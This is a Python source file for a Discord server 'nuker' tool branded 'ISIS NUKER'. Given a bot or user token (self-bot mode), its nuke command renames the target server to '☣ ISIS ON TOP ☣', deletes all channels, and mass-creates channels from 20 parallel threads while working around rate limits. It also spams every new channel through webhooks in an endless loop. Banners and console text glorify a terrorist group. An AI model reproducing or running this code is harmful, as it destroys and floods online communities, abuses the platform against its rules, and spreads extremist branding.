import discord
from discord.ext import commands
import threading
import json
import time
import requests
import os
from discord.ext.commands import CommandNotFound
import colorama
from colorama import Fore, Back, Style
import asyncio
import json
from pystyle import *
import logging

logging.getLogger("discord.http").setLevel(logging.ERROR)


os.system("title ISIS NUKER ☣")

with open('config.json', 'r') as config_file:
    config = json.load(config_file)


token = config["token"]
prefix = config["prefix"]
message = config["message"]
channel_name = config["channel_name"]


def clear():
    os.system("cls")

clear()

def check():
    headers = {
    "authorization": token
    }
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if r.status_code == 200:
        return "user"
    elif r.status_code == 429:
        os.system("cls")
        print("Dropping Bombs On That Server !")
        input()
    else:
        return "bot"

user = 'user'


if user == check():
    try:
        astro = commands.Bot(command_prefix=prefix, self_bot=True)
        astro.remove_command("help")
        headers = {
        "authorization": token
        }
    except:
        pass
else:
    try:
        intents = discord.Intents.all()
        intents.members = True
        astro = commands.Bot(command_prefix=prefix, intents=intents)
        astro.remove_command("help")
        headers = {
        "authorization": f"Bot {token}"
        }
    except:
        pass  

nuke1 = False

def chn1():
    try:
        r = requests.delete(f"https://discord.com/api/v9/channels/{chn_id}", headers=headers)
        if r.status_code == 429:
            n = r.json()
            time.sleep(n['retry_after'])
    except:
        pass

def channel1():
    payload = {
        "name": channel_name,
        "type": "0"
    }
    try:
        for i in range(100):
            r = requests.post(f"https://discord.com/api/v9/guilds/{sid}/channels", headers=headers, json=payload)
            if r.status_code == 429:
                s = r.json()
                time.sleep(s['retry_after'])
    except:
        pass


def cdel1():
    t = threading.Thread(target=chn1)
    t.start()
    
def chnthread():
    global nuke1
    nuke1 = True
    for i in range(20):
        t = threading.Thread(target=channel1)
        t.start()    

def chnthread1():
    for i in range(20):
        t = threading.Thread(target=channel1)
        t.start()    

        

@astro.command()
async def nuke(ctx):
    os.system("title ISIS NUKER ☣")
    global chn_id
    global nuke1
    global sid
    sid = ctx.guild.id
    nuke1 == True
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        await ctx.guild.edit(name="☣ ISIS ON TOP ☣")
    except:
        pass
    try:
        for chn in ctx.guild.channels:
            chn_id = chn.id
            cdel1()
    except:
        pass
    await chnthread()

@astro.event
async def on_ready():
    clear()
    time.sleep(1)
    welcome = """
▄▄▌ ▐ ▄▌▄▄▄ .▄▄▌   ▄▄·       • ▌ ▄ ·. ▄▄▄ .    ▄▄▄▄▄          ▪  .▄▄ · ▪  .▄▄ ·     
██· █▌▐█▀▄.▀·██•  ▐█ ▌▪▪     ·██ ▐███▪▀▄.▀·    •██  ▪         ██ ▐█ ▀. ██ ▐█ ▀.     
██▪▐█▐▐▌▐▀▀▪▄██▪  ██ ▄▄ ▄█▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄     ▐█.▪ ▄█▀▄     ▐█·▄▀▀▀█▄▐█·▄▀▀▀█▄    
▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐███▌▐█▌.▐▌██ ██▌▐█▌▐█▄▄▌     ▐█▌·▐█▌.▐▌    ▐█▌▐█▄▪▐█▐█▌▐█▄▪▐█    
 ▀▀▀▀ ▀▪ ▀▀▀ .▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀      ▀▀▀  ▀█▄▀▪    ▀▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀▀   
                                    ⚠︎Press Enter⚠︎
    """
    Anime.Fade(Center.Center(welcome), Colors.purple_to_red, Colorate.Vertical, enter = True)
    time.sleep(1)
    clear()
    Write.Print("ISIS ON TOP", Colors.red_to_purple, interval=0.05)
    ascii = f"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣀⠀⢠⡀⣿⣰⢀⣠⠴⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣙⣳⣿⣿⣿⣿⣅⣀⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⣄⣤⣄⣠⣶⣿⡭⣙⣷⣿⣿⣿⣯⡉⠉⠁
⠀⠀⠀⠀⢀⣤⡶⠚⣿⣿⢡⣷⡻⣿⡺⡿⣻⣄⠀⣰⠟⢹⡟⣿⠀⠉⠀⠀
⠀⠀⢀⡴⠛⠙⣶⣾⣿⣿⡘⢿⣿⣷⣯⣟⣛⡟⠰⠁⠀⢸⡇⠘⡆⠀⠀⠀
⠀⢠⠏⠀⠀⣰⣿⣿⣿⣿⣿⣶⣍⣛⠻⠿⠟⣼⡆⠀⠀⢸⠃⠀⠀⠀⠀⠀
⠀⣿⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠘⠂⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀

    """
    print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(ascii)))
    Write.Print(f" --> {prefix}nuke <--", Colors.red_to_purple, interval=0.05)
                                
@astro.event
async def on_command_error(ctx, a):
    if isinstance(a, CommandNotFound):
        try:
            await ctx.message.delete()
        except:
            pass

@astro.event
async def on_guild_channel_create(channel):
    global nuke1
    if nuke1 == True:
        try:
            webhook = await channel.create_webhook(name="Extraction")
            while True:
                await webhook.send(message)
        except:
            pass


        
if user == check():
    try:
        astro.run(token, bot=False)
    except:
        print("Invalid token. Press anything to exit.")
        input()
else:
    try:
        astro.run(token)
    except:
        print("Invalid token. Press anything to exit.")
        input()
